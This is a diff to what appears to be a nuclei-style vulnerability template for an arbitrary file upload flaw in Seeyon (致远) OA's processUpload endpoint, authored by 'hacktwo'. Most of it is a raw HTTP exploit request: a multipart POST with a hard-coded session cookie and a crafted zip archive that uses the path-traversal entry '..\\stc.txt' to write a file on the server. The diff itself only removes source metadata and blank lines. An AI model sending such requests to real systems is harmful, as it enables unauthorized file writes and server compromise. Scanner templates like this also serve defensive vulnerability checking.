@@ -3,14 +3,8 @@ info:
   name: 致远OA后台processUpload任意文件上传漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/815e8f7816e5ea212cfdb118078707b4
-
-    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  description: '[!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
   tags: file-upload,2025
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: 815e8f7816e5ea212cfdb118078707b4
-    fofa: + hunter`app.name="致远 OA"`
 http:
 - raw:
   - 'POST /seeyon/thirdpartyController.do HTTP/1.1
@@ -41,7 +35,7 @@ http:
     - 200
     type: status
 - raw:
-  - "POST /seeyon/fileUpload.do?method=processUpload&amp;maxSize HTTP/1.1\nCookie: JSESSIONID=362A92A2CE0674D8C07ECF20CB8FCD36\nContent-Type: multipart/form-data; boundary=00content0boundary00\nUser-Agent: Java/1.8.0_391\nHost: {{Hostname}}\nAccept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2\nContent-Length: 938\nConnection: close\n\n--00content0boundary00\nContent-Disposition: form-data; name=\"type\"\n\n\n--00content0boundary00\nContent-Disposition: form-data; name=\"extensions\"\n\n\n--00content0boundary00\nContent-Disposition: form-data; name=\"applicationCategory\"\n\n\n--00content0boundary00\nContent-Disposition: form-data; name=\"applicationCategory\"\n\n\n--00content0boundary00\nContent-Disposition: form-data; name=\"destFilename\"\n\n\n--00content0boundary00\nContent-Disposition: form-data; name=\"maxSize\"\n\n\n--00content0boundary00\nContent-Disposition: form-data; name=\"isEncrypt\"\n\n\n--00content0boundary00\nContent-Disposition: form-data; name=\"file1\"; filename=\"stc1.zip\"\n\nPK\x03\x04\x14\0\0\0\0È\nlW\0\0\0\0\x02\0\0\0\0\0\0\0\n\0\0\0layout.xml\x03\0PK\x03\x04\x14\0\0\0\0È\nlWÚ¹Ø\x01&\0\0\0$\0\0\0\n\0\0\0..\\stc.txtK¶L2¶´4MÓ5J17Ñ51±HÑM471Ò56I37JNK4L54\x01\0PK\x01\x02\x14\x03\x14\0\0\0\0È\nlW\0\0\0\0\x02\0\0\0\0\0\0\0\n\0\0\0\0\0\0\0\0\0\0\0\x80\x01\0\0\0\0layout.xmlPK\x01\x02\x14\x03\x14\0\0\0\0È\nlWÚ¹Ø\x01&\0\0\0$\0\0\0\n\0\0\0\0\0\0\0\0\0\0\0\x80\x01*\0\0\0..\\stc.txtPK\x05\x06\0\0\0\0\x02\0\x02\0p\0\0\0x\0\0\0\0\0\n--00content0boundary00--"
+  - "POST /seeyon/fileUpload.do?method=processUpload&amp;maxSize HTTP/1.1\nCookie: JSESSIONID=362A92A2CE0674D8C07ECF20CB8FCD36\nContent-Type: multipart/form-data; boundary=00content0boundary00\nUser-Agent: Java/1.8.0_391\nHost: {{Hostname}}\nAccept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2\nContent-Length: 938\nConnection: close\n\n--00content0boundary00\nContent-Disposition: form-data; name=\"type\"\n\n--00content0boundary00\nContent-Disposition: form-data; name=\"extensions\"\n\n--00content0boundary00\nContent-Disposition: form-data; name=\"applicationCategory\"\n\n--00content0boundary00\nContent-Disposition: form-data; name=\"applicationCategory\"\n\n--00content0boundary00\nContent-Disposition: form-data; name=\"destFilename\"\n\n--00content0boundary00\nContent-Disposition: form-data; name=\"maxSize\"\n\n--00content0boundary00\nContent-Disposition: form-data; name=\"isEncrypt\"\n\n--00content0boundary00\nContent-Disposition: form-data; name=\"file1\"; filename=\"stc1.zip\"\n\nPK\x03\x04\x14\0\0\0\0È\nlW\0\0\0\0\x02\0\0\0\0\0\0\0\n\0\0\0layout.xml\x03\0PK\x03\x04\x14\0\0\0\0È\nlWÚ¹Ø\x01&\0\0\0$\0\0\0\n\0\0\0..\\stc.txtK¶L2¶´4MÓ5J17Ñ51±HÑM471Ò56I37JNK4L54\x01\0PK\x01\x02\x14\x03\x14\0\0\0\0È\nlW\0\0\0\0\x02\0\0\0\0\0\0\0\n\0\0\0\0\0\0\0\0\0\0\0\x80\x01\0\0\0\0layout.xmlPK\x01\x02\x14\x03\x14\0\0\0\0È\nlWÚ¹Ø\x01&\0\0\0$\0\0\0\n\0\0\0\0\0\0\0\0\0\0\0\x80\x01*\0\0\0..\\stc.txtPK\x05\x06\0\0\0\0\x02\0\x02\0p\0\0\0x\0\0\0\0\0\n--00content0boundary00--"
   redirects: false
   matchers:
   - status:
